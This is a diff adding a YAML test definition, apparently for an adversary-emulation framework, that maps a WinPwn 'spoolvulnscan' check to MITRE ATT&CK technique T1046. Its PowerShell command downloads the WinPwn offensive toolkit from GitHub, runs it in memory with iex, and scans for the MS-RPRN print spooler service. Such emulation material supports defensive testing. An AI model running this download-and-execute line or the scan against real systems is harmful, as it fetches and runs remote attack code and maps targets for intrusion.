@@ -1,0 +1,13 @@
+- id: c9e3ffdc-a990-5406-8100-cac7809189ea
+  name: Soumaia ART Tests - WinPwn - spoolvulnscan
+  description: Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn
+  tactic: discovery
+  technique:
+    attack_id: T1046
+    name: Network Service Discovery
+  platforms:
+    windows:
+      psh:
+        command: |-
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+          spoolvulnscan -noninteractive -consoleoutput
